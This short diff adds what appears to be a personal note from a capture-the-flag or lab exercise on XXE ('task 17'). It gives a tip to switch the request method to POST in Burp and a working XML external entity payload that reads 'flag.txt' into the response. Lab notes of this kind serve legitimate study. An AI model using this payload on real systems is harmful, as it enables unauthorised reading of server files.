@@ -1,0 +1,7 @@
+XXE
+task 17
+Burp change method to POST
+
+<?xml version="1.0"?>
+<!DOCTYPE title [<!ENTITY sp SYSTEM "flag.txt"> ]>
+<title>&sp;</title>
